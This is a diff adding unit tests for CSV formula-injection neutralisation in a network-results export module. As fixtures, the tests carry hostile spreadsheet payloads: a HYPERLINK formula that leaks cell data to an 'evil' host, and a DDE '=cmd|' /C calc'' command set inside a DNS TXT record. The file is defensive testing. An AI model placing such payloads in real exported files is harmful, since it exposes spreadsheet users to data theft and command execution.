@@ -12,6 +12,7 @@ import {
   exportNetworkResults,
   pingResultsToCsv,
   portScanResultsToCsv,
+  tableToCsv,
   tracerouteHopsToCsv,
 } from "./exportResults";
 import type { DnsRecord, PingResult, TracerouteHop } from "@/types/network";
@@ -70,6 +71,53 @@ describe("network export CSV formatters", () => {
     expect(dnsRecordsToCsv(records)).toBe(
       'type,name,value,ttl\nA,example.com,93.184.216.34,300\nTXT,example.com,"v=spf1, -all",60\n'
     );
+  });
+});
+
+describe("CSV formula neutralisation (#4376, LIBFE2-002)", () => {
+  it("prefixes a single quote to string cells starting with = + - @", () => {
+    expect(
+      tableToCsv({
+        columns: ["value"],
+        rows: [["=1+1"], ["@SUM(A1)"], ["+cmd"], ["-2+3"]],
+      })
+    ).toBe("value\n'=1+1\n'@SUM(A1)\n'+cmd\n'-2+3\n");
+  });
+
+  it("neutralises leading TAB and CR, then applies RFC 4180 quoting", () => {
+    expect(
+      tableToCsv({
+        columns: ["value"],
+        rows: [["\tx"], ["\rx"], ['=HYPERLINK("http://evil/?"&A1,"click")']],
+      })
+    ).toBe('value\n\'\tx\n"\'\rx"\n"\'=HYPERLINK(""http://evil/?""&A1,""click"")"\n');
+  });
+
+  it("neutralises a remote-controlled DNS TXT value", () => {
+    const records: DnsRecord[] = [
+      { recordType: "TXT", name: "evil.example", value: "=cmd|' /C calc'!A0", ttl: 60 },
+    ];
+    expect(dnsRecordsToCsv(records)).toBe(
+      "type,name,value,ttl\nTXT,evil.example,'=cmd|' /C calc'!A0,60\n"
+    );
+  });
+
+  it("leaves numeric cells numeric, including negative numbers", () => {
+    expect(
+      tableToCsv({
+        columns: ["latency_ms", "offset", "ok"],
+        rows: [
+          [-1.5, -42, true],
+          [0, 3, false],
+        ],
+      })
+    ).toBe("latency_ms,offset,ok\n-1.5,-42,true\n0,3,false\n");
+  });
+
+  it("leaves ordinary strings untouched", () => {
+    expect(
+      tableToCsv({ columns: ["host"], rows: [["example.com"], ["a=b"], ["10.0.0.1"], [""]] })
+    ).toBe("host\nexample.com\na=b\n10.0.0.1\n\n");
   });
 });
 
